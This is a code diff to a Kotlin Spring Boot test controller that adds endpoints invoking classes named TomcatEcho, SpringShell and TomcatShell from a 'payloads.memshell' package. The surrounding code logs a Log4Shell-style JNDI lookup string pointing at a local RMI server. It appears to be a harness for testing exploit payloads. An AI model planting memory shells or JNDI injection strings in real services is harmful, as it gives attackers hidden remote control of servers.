@@ -1,5 +1,8 @@
 package springboot
 
+import http.payloads.echo.TomcatEcho
+import http.payloads.memshell.SpringShell
+import http.payloads.memshell.TomcatShell
 import org.apache.logging.log4j.LogManager
 import org.springframework.web.bind.annotation.RequestMapping
 import org.springframework.web.bind.annotation.RequestParam
@@ -19,6 +22,27 @@ class TestController {
         } else {
             logger.error(String.format("\${jndi:rmi://127.0.0.1:1099/%s}", index))
         }
+        return "200 OK"
+    }
+
+    @ResponseBody
+    @RequestMapping("/tomcat-echo")
+    fun tomcatEcho(): String {
+        TomcatEcho()
+        return "200 OK"
+    }
+
+    @ResponseBody
+    @RequestMapping("/spring-shell")
+    fun springShell(): String {
+        SpringShell()
+        return "200 OK"
+    }
+
+    @ResponseBody
+    @RequestMapping("/tomcat-shell")
+    fun tomcatShell(): String {
+        TomcatShell()
         return "200 OK"
     }
 }
